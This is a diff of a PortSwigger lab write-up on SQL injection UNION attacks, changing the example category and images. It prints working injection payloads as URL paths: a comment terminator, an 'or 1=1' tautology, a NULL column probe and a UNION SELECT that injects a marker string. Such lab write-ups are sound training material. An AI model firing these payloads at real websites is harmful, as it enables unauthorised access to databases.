@@ -15,30 +15,37 @@ Reference: https://portswigger.net/web-security/sql-injection/union-attacks
 We see there are 2 values displayed in the table, the name and the price of the products:
 
 
+<img width="1301" height="722" alt="1" src="https://github.com/user-attachments/assets/4f7b3f18-44aa-40d5-ab52-9c518c414a92" />
 
-![img](images/SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/1.png)
 
 
-We find these payload are valid to display the 4 items in Accessories and all the items:
+We find these payload are valid to display the 4 items in Pets and all the items:
 
 ```
-/filter?category=Accessories'--
-/filter?category=Accessories'+or+1=1--
+/filter?category=Pets'--
+/filter?category=Pets'+or+1=1--
 ```
+
+
+<img width="1526" height="784" alt="2" src="https://github.com/user-attachments/assets/d1f6a2a7-5012-44c1-b43b-f4b1801eff18" />
+
 
 Also, that there are 3 columns returned by the query and we can do a UNION attack with:
 
 ```
-/filter?category=Accessories'+union+all+select+NULL,NULL,NULL--
+/filter?category=Pets'+union+all+select+NULL,NULL,NULL--
 ```
+
+
+<img width="1522" height="807" alt="3" src="https://github.com/user-attachments/assets/a77d6d12-b21a-43db-9059-0b88ecf4a35d" />
 
 
 We can print the string Qrc0Pq setting this string in the second value of the attack:
 
 ```
-/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
+/filter?category=Pets'+union+all+select+'0','Qrc0Pq','123'--
 ```
 
 
+<img width="1517" height="800" alt="4" src="https://github.com/user-attachments/assets/d5c0dd5c-9558-4db3-9d6d-413c70553ed5" />
 
-![img](images/SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/2.png)
